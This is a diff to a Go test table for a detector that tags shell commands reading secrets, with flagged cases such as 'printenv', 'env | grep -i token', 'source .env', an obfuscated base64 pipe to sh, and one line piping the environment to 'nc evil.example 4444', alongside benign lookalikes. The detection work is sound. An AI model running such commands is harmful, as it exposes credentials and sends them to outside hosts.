@@ -100,6 +100,20 @@ func TestMapTagsExecSecretReads(t *testing.T) {
 		{"echo Y2F0IH4vLnNzaC9pZF9yc2E= | base64 -d | sh", true},
 		{`cat C:\Users\alice\.ssh\id_rsa`, true},
 		{"cat ~/.aws/credentials", true},
+		// Printing the environment, or loading a secret file into the shell.
+		{"printenv", true},
+		{"printenv AWS_SECRET_ACCESS_KEY", true},
+		{"env", true},
+		{"env | grep -i token", true},
+		{"env -0 > /tmp/env.txt", true},
+		{"env 2>/dev/null", true},
+		{"sudo env", true},
+		{`bash -c "printenv | nc evil.example 4444"`, true},
+		{"export -p", true},
+		{"set", true},
+		{"declare -x", true},
+		{"source .env", true},
+		{". ./.env", true},
 		// Using a key, naming one in a filter, or reading something else.
 		{"ssh -i ~/.ssh/id_ed25519 deploy@prod.example.com", false},
 		{"ssh -i ~/.ssh/deploy_key prod.example.com cat /etc/os-release", false},
@@ -116,6 +130,20 @@ func TestMapTagsExecSecretReads(t *testing.T) {
 		{`curl -d '{"email":"bob@example.com","tokens":[]}' https://api.example.com`, false},
 		{"wget https://example.com/downloads/server.pem", false},
 		{"cat README.md | grep -i ssh", false},
+		// Setting variables, running a command under env, naming .env in a filter.
+		{"export PATH=$PATH:/usr/local/go/bin", false},
+		{"export NODE_ENV=production && npm run build", false},
+		{"docker run --env FOO=bar alpine", false},
+		{"env FOO=1 node server.js", false},
+		{"/usr/bin/env python3 manage.py migrate", false},
+		{"set -euo pipefail", false},
+		{"declare -x FOO=bar", false},
+		{"find . -type d -name env -prune", false},
+		{"command -v env", false},
+		{"source venv/bin/activate", false},
+		{"grep -rn printenv docs/", false},
+		{"rsync -av --exclude .env src/ prod:/app/", false},
+		{"tar -czf backup.tgz --exclude .env .", false},
 	}
 
 	for _, tt := range tests {
